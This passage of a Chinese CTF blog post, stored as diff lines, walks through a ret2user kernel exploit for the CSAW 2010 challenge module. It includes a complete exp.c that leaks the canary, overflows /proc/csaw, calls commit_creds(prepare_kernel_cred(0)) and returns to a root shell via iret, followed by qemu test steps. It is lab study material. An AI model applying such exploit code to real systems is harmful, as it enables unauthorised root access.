+</li>
+<li><p>用<code>commit_creds(prepare_kernel_cred(0));</code>实现<strong>内核态</strong>的提权。</p>
+</li>
+<li><p>伪造<code>trap_frame</code>结构体，将其<code>eip</code>指向<code>shell</code>，并将结构体设为栈顶。</p>
+</li>
+<li><p>调用<code>iret</code>返回<strong>用户态</strong>执行。即可完成。</p>
+</li>
+</ol>
+</blockquote>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终的<code>exp.c</code>如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span></span><br><span class="line">        <span class="string">"pushfl; popl tf+8;"</span></span><br><span class="line">        <span class="string">"pushl %esp; popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss; popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067fc0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067e20</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">        <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="comment">//memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">84</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">84</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(poc+<span class="number">64</span>,canary,<span class="number">4</span>);<span class="comment">//set canary</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]payload:%s\n"</span>,poc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:\n"</span>);</span><br><span class="line">    <span class="comment">//init tf struct;</span></span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd,poc,<span class="number">84</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><code>exp.c</code>编译后丢到<code>_install/usr</code>下，然后在<code>_install</code>目录下重新打包文件系统：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>qemu</code>起系统，像这样模仿<code>muhe</code>师傅的操作添加一个用户：</p>
+<p><img src="/KERNEL-CSAW-2010-kernel/1561028920879.png" alt="1561028920879"></p>
+<p>呃，这里不要忘记先在<code>root</code>下<code>insmod csaw.ko</code>。</p>
+<p>然后<code>root</code>：</p>
+<p><img src="/KERNEL-CSAW-2010-kernel/1561029351300.png" alt="1561029351300"></p>
+<h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><p>算是自己正经分析的第一篇<code>kernel</code>的<code>exp</code>了，差不多把基本的套路摸清楚了，但是其实也只是梳理清楚了别人的思路，路还有很长，冲冲冲。</p>
+<p>这种利用方法似乎就叫做<code>ret2user</code>，<code>SMEP</code>保护其实就是为了防止这种情况发生的，还有如果开了<code>KALSR</code>这些内核函数的地址应该怎么搞呢，这些都是值得思考的问题。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://jon.oberheide.org/blog/2010/11/02/csaw-ctf-kernel-exploitation-challenge/" target="_blank" rel="noopener">题目作者的博客</a></p>
+<p><a href="https://www.anquanke.com/post/id/85848" target="_blank" rel="noopener">muhe师傅的第三篇入门文章实战</a></p>
+<p><a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">muhe师傅的第二篇入门文章调试</a></p>
+<p><a href="https://bestwing.me/write-kernel-exploits-2.html" target="_blank" rel="noopener">swing师傅的内核文章</a></p>
+
+      
+
+    </div>
+
+
+
+
+
+    <footer class="article-footer">
+      
+        <a data-url="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/" data-id="cjx4lnnqd000000vgj8uitsfp" class="article-share-link" data-share="baidu" data-title="KERNEL-CSAW-2010-kernel">分享到</a>
+      
+
+      
+        <a href="http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/#gitalk-container" class="article-comment-link">评论</a>
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/">kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/造轮子/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">← 上一篇</strong>
+      <div class="article-nav-title">造轮子</div>
+    </a>
+  
+  
+</nav>
+
+
+  
+</article>
+
+
+
+
+  <section class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section> 
+
+
+
+
+  <div id="gitalk-container"></div>
+
+
+</section>
+      
+      <aside   id="sidebar">
+  
+    
+  <div class="widget-wrap">
+
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/KERNEL-CSAW-2010-kernel/">KERNEL-CSAW-2010-kernel</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/造轮子/">造轮子</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/pwntools的使用技巧/">pwntools的使用技巧</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/pwnab13-7w/">pwnab13.7w</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/t1an5t的2020/">t1an5t的2020</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-tasks"></i>分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/kernel/">kernel</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwnable/">pwnable</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+  <script>
+  $(document).on("click", "ul.category-list li.category-list-item", function () {
+    window.location.href = $(this).find('a').attr('href')
+  })
+  </script>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-cloud"></i>标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-tw/" style="font-size: 10px;">pwnable.tw</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-archive"></i>归档</h3>
+    <div class="widget">
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">一月 1999</a><span class="archive-list-count">1</span></li></ul> -->
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">1999年01月</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+<script>
+$(document).on("click", "ul.archive-list li.archive-list-item", function () {
+  window.location.href = $(this).find('a').attr('href')
+})
+</script>
+
+  
+    
+  <style>
+  *{ margin: 0; padding: 0;}
+  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
+  .tooltips p.content{ padding: 5px; }
+  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
+  .tooltips .triangle-back{ margin-top: -1px;}
+
+  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
+  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
+  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}
+
+
+  .icoSize{font-size: 2em}
+  </style>
+
+
+
+  <div class="widget-wrap">
+    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-link"></i>链接</h3>
+    <div class="widget" style="z-index: 1;">
+
+
+
+
+
+      <!-- <ul> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank"  href="https://github.com/tianstcht">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+                  <a id="zhihu-icon-color" class="weight-icon-link" target="_blank" href="https://www.zhihu.com/people/T1an5t">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa  fa-stack-1x fa-inverse">知</i>
+                      </span>
+                  </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+            <a id="weixin-icon-color" class="weight-icon-link"  href="javascript:;"   id="weixin-icon" target="_blank" tooltips="<img src='tianst19970828'>">
+                <span class="fa-stack fa-lg">
+                      <i class="fa fa-circle fa-stack-2x"></i>
+                      <i class="fa fa-weixin  fa-stack-1x fa-inverse"></i>
+                  </span>
+              </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+            <a id="qq-icon-color" class="weight-icon-link"  href="javascript:;"   id="qq-icon" target="_blank" tooltips="<img src='1037178204'>">
+                <span class="fa-stack fa-lg">
+                      <i class="fa fa-circle fa-stack-2x"></i>
+                      <i class="fa fa-qq  fa-stack-1x fa-inverse"></i>
+                  </span>
+              </a>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank"  href="1037178204@qq.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
+                  <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+          <!-- <li> -->
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+
+          
+
+          
+
+
+          <!-- </li> -->
+        
+      <!-- </ul> -->
+    </div>
+  </div>
+
+
+  <script>
+  $.fn.extend({
+    hoverTips : function (){
+      var self = $(this);
+      var sw = self.get(0).switch;
+      if( !sw ) {
+        sw = true;
+        var content = self.attr("tooltips");
+        var htmlDom = $("<div class='tooltips'>")
+            .addClass("toolTipInfo")
+            .html("<p class='content'></p>"
+                + "<p class='triangle-front'></p>"
+                + "<p class='triangle-back'></p>");
+        htmlDom.find("p.content").html( content );
+      }
+      self.on("mouseover",function(){
+        $("body").append( htmlDom );
+        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
+        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
+        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
+        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
+      });
+      self.on("mouseout",function(){
+        var top = parseInt(htmlDom.css("top"));
+        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
+          htmlDom.remove();
+          sw = false;
+        });
+      });
+    },
+
+  });
+
+  $("#weixin-icon-color").hoverTips();
+  $("#qq-icon-color").hoverTips();
+  </script>
+
+
+
+  
+    
+    <div class="widget-wrap">
+  
+      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友链</h3>
+      <div class="widget">
+        <ul>
+        
+        </ul>
+      </div>
+    </div>
+  
+  
+  
+</aside>
+
+      
+    </div>
+    <footer  id="footer">
+  
+  <div  data-scroll-reveal="enter bottom"  class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 t1an5t<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
+    </div>
+
+    <div id="footer-info" class="inner">
+        <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      <span id="busuanzi_container_site_pv"> 访问量
+      <font color="#FF3030"><i class="fa fa-heartbeat"></i></i></font>
+      <span id="busuanzi_value_site_pv"></span>次</span>
+
+      <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1257415698'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1257415698%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+
+    </div>
+  </div>
+
+</footer>
+
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
+  
+    <a href="/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
+  
+    <a href="/about_me.html" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
+  
+</nav>
+
+  <!-- totop start -->
+<div id="totop">
+<a title="返回顶部"><img src="/img/betop.png"/></a>
+</div>
+
+<!-- totop end -->
+
+
+
+  <script>
+    var disqus_shortname = 'rapcoder';
+    if (page.permalink){ 
+      var disqus_url = 'http://tianstcht.github.io/KERNEL-CSAW-2010-kernel/';
+     } 
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+
+
+<!-- 百度分享 start -->
+
+<div id="article-share-box" class="article-share-box">
+  <div id="bdshare" class="bdsharebuttonbox article-share-links">
+    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
+    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
+    <a class="article-share-more" data-cmd="more" title="更多"></a>
+  </div>
+</div>
+<script>
+  function SetShareData(cmd, config) {
+    if (shareDataTitle && shareDataUrl) {
+      config.bdText = shareDataTitle;
+      config.bdUrl = shareDataUrl;
+    }
+    return config;
+  }
+  window._bd_share_config={
+    "common":{onBeforeClick: SetShareData},
+    "share":{"bdCustomStyle":"/css/bdshare.css"}
+  };
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+<!-- 百度分享 end -->
+
+<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
+<script src="//cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>
+
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+<! -- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+                processEscapes: true
+                    
+}
+  
+        });
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+tex2jax: {
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+                  
+}
+    
+        });
+</script>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Queue(function() {
+            var all = MathJax.Hub.getAllJax(), i;
+            for(i=0; i < all.length; i += 1) {
+                            all[i].SourceElement().parentNode.className += ' has-jax';
+                                    
+            }
+                
+        });
+</script>
+
+<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<script src="/js/script.js"></script>
+
+
+</div>
+</body>
+</html>
+
+
+
+<div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+</div>
+
+
+<script>
+$(document).ready(function(){
+window.scrollReveal = new scrollReveal({ reset: true});
+//
+})
+</script>
